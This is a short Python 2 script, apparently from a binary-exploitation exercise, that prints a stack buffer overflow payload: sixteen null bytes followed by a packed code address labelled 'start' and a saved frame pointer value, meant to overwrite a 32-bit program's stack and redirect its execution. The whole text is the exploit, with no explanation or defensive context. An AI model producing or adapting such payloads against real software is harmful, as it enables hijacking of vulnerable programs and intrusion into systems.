from struct import pack

start = 0x0804889c
ebp = 0xbffefbd8

print '\x00'*16 + pack('<I',start) + pack('<I',ebp)